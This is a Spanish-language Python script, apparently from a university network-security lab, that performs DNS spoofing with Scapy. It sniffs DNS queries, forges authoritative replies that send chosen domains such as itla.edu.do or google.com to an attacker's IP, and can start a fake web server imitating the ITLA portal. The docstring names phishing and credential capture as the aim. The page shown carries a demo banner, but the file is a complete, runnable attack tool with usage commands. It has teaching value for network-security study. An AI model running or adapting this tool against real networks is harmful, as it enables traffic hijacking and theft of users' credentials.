#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         ATAQUE DNS SPOOFING / DNS POISONING                     ║
║         Seguridad de Redes — Laboratorio #9                     ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Intercepta consultas DNS y responde con registros falsificados,
    redirigiendo dominios específicos (ej: itla.edu.do) a una IP
    controlada por el atacante donde corre un servidor web falso.

    El ataque requiere estar en posición MitM (via ARP Spoofing)
    o en la misma red que la víctima para interceptar las consultas.

    Flujo:
    1. Víctima consulta DNS: "¿Cuál es la IP de itla.edu.do?"
    2. Atacante intercepta y responde: "itla.edu.do = 192.168.1.50"
    3. Víctima conecta al servidor web falso del atacante
    4. Atacante puede servir página de phishing o capturar credenciales

Requisitos:
    pip3 install scapy
    Ejecutar como root
    Recomendado: Ejecutar junto con arp_mitm.py para interceptar

Uso:
    # Básico: redirigir itla.edu.do
    sudo python3 dns_spoof.py -i ens3 --target itla.edu.do --redirect 192.168.1.50

    # Con servidor web falso integrado
    sudo python3 dns_spoof.py -i ens3 --target itla.edu.do --redirect 192.168.1.50 --web

    # Múltiples dominios
    sudo python3 dns_spoof.py -i ens3 --target "itla.edu.do,google.com" --redirect 192.168.1.50
"""

import argparse
import os
import sys
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    from scapy.all import (
        IP, UDP, DNS, DNSQR, DNSRR,
        Ether, sniff, send, conf
    )
except ImportError:
    print("[!] Instalar Scapy: pip3 install scapy")
    sys.exit(1)


# ── Servidor Web Falso ────────────────────────────────────────────

FAKE_PAGE = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>ITLA — Instituto Tecnológico de Las Américas</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #003366;
               color: white; text-align: center; padding: 50px; }}
        .logo {{ font-size: 48px; font-weight: bold; color: #FFD700; }}
        .msg  {{ font-size: 24px; margin-top: 20px; }}
        .warn {{ background: #FF0000; padding: 10px; margin-top: 30px;
                border-radius: 8px; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="logo">ITLA</div>
    <div class="msg">Instituto Tecnológico de Las Américas</div>
    <p>Bienvenido al portal institucional</p>
    <div class="warn">
        ⚠️ DEMO — Este es un servidor web falso para demostración de DNS Spoofing<br>
        Laboratorio de Seguridad de Redes
    </div>
</body>
</html>"""


class FakeWebHandler(BaseHTTPRequestHandler):
    """Manejador del servidor web falso."""

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(FAKE_PAGE.encode())
        print(f"[WEB] Conexión recibida de {self.client_address[0]} → {self.path}")

    def log_message(self, format, *args):
        pass  # Silenciar logs por defecto


def start_web_server(port=80):
    """Inicia el servidor web falso en un hilo separado."""
    try:
        server = HTTPServer(('0.0.0.0', port), FakeWebHandler)
        print(f"[+] Servidor web falso iniciado en puerto {port}")
        server.serve_forever()
    except PermissionError:
        print(f"[!] Puerto {port} requiere root. Usando puerto 8080...")
        server = HTTPServer(('0.0.0.0', 8080), FakeWebHandler)
        print(f"[+] Servidor web falso iniciado en puerto 8080")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Error iniciando servidor web: {e}")


# ── DNS Spoofing ──────────────────────────────────────────────────

class DNSSpoofServer:
    """Intercepta consultas DNS y responde con IPs falsas."""

    def __init__(self, iface, targets, redirect_ip, ttl=300):
        self.iface       = iface
        self.targets     = [t.lower().strip('.') for t in targets]
        self.redirect_ip = redirect_ip
        self.ttl         = ttl
        self.spoofed     = 0
        self.total       = 0
        conf.verb        = 0

    def handle_packet(self, pkt):
        """Procesa cada paquete DNS capturado."""
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return  # Solo DNS queries (qr=0)

        self.total += 1
        query = pkt[DNSQR].qname.decode().rstrip('.')

        # Verificar si el dominio consultado es un objetivo
        is_target = any(
            query.lower() == t or query.lower().endswith('.' + t)
            for t in self.targets
        )

        if not is_target:
            return

        print(f"\n[!] DNS Query interceptada: {query} → respondiendo con {self.redirect_ip}")

        # Construir respuesta DNS falsa
        spoofed_response = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,        # Mismo ID de la consulta
                qr=1,                  # Es una respuesta
                aa=1,                  # Authoritative Answer
                qd=pkt[DNS].qd,        # Repetir la pregunta
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,
                    type='A',
                    ttl=self.ttl,
                    rdata=self.redirect_ip
                )
            )
        )

        send(spoofed_response, verbose=0)
        self.spoofed += 1
        print(f"[+] Respuesta falsa enviada: {query} → {self.redirect_ip}")
        print(f"[*] Total spoofed: {self.spoofed} | Total consultas: {self.total}")

    def run(self):
        """Inicia la captura y procesamiento de paquetes DNS."""
        print(f"""
╔══════════════════════════════════════════╗
║       DNS Spoofing — Activo              ║
╠══════════════════════════════════════════╣
║  Interfaz  : {self.iface:<27} ║
║  Objetivo  : {', '.join(self.targets)[:27]:<27} ║
║  Redirige  : {self.redirect_ip:<27} ║
║  TTL       : {self.ttl}s{'':<24} ║
╚══════════════════════════════════════════╝
[*] Escuchando consultas DNS... (Ctrl+C para salir)
[!] Para mayor efectividad, ejecutar junto con ARP MitM
""")

        sniff(
            iface=self.iface,
            filter="udp port 53",
            prn=self.handle_packet,
            store=False
        )


# ── CLI ───────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Ataque DNS Spoofing — redirige dominios a IP del atacante"
    )
    parser.add_argument('-i', '--iface',    required=True, help='Interfaz de red')
    parser.add_argument('--target',         default='itla.edu.do',
                        help='Dominio(s) objetivo separados por coma (default: itla.edu.do)')
    parser.add_argument('--redirect',       required=True,
                        help='IP a la que redirigir (generalmente IP del atacante)')
    parser.add_argument('--ttl',            type=int, default=300,
                        help='TTL de la respuesta DNS falsa (default: 300)')
    parser.add_argument('--web',            action='store_true',
                        help='Iniciar servidor web falso en el atacante')
    parser.add_argument('--web-port',       type=int, default=80,
                        help='Puerto del servidor web falso (default: 80)')
    return parser.parse_args()


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)

    args    = parse_args()
    targets = [t.strip() for t in args.target.split(',')]

    # Iniciar servidor web falso si se solicitó
    if args.web:
        web_thread = threading.Thread(
            target=start_web_server,
            args=(args.web_port,),
            daemon=True
        )
        web_thread.start()
        time.sleep(1)

    # Iniciar DNS Spoofing
    server = DNSSpoofServer(
        iface       = args.iface,
        targets     = targets,
        redirect_ip = args.redirect,
        ttl         = args.ttl
    )

    try:
        server.run()
    except KeyboardInterrupt:
        print(f"\n[*] DNS Spoofing detenido")
        print(f"[+] Total consultas interceptadas: {server.total}")
        print(f"[+] Total respuestas falsas enviadas: {server.spoofed}")
